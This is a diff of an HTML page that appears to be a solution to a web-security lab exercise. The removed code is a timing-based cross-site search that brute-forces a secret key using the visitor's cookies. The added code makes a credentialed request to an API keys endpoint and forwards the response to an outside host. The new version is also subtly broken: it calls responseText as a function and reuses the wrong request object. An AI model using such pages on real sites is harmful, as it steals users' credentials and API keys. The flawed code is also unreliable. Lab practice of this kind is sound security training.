@@ -3,40 +3,16 @@
 </head>
 <body>
     <script>
-        var all = "0123456789-abcdef".split("");
-        var base = "http://ptl-5887ed18-45b75fc8.libcurl.so/search?search=^";
-        var counter = 0;
-        var cur = "";
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST","http://api-ptl-ad42da05-c93d6931.libcurl.so//api/v1/keys",false);
+        xhr.withCredentials = true;
+        xhr.send();
+        var a = xhr.responseText();
         
-        function check(cur,counter){
-            url = base+cur+all[counter];
-            var val = cur+all[counter];
-            v = performance.now();
-            fetch(url,
-                  {method:'GET',credentials:'include',mode:'no-cors'}
-                 ).catch(err => {
-                        console.log("ERR"+val);
-            }).then(response => {
-                z=performance.now();
-                if (z-v < 3000){
-                    document.write("<br/>INVALID"+val+(z-v).toString());
-                }else{
-                    document.write("<br/>FOUND"+val+(z-v).toString());
-                    document.write("<img src='http://lab--work.herokuapp.com/?key="+val+"'/>");
-                    j =0
-                    while(j < all.length){
-                        check(val,j);
-                        j += 1;
-                    }
-                }
-            })
-        }
-        
-        i=0;
-        while(i < all.length){
-            setTimeout(check("",i),500*i);
-            i += 1;
-        }
+        var xhr2 = new XMLHttpRequest();
+        xhr.open("GET","http://lab--work.herokuapp.com/"+a,false);
+        xhr2.withCredentials = true;
+        xhr2.send();
     </script>
 </body>
 </html>
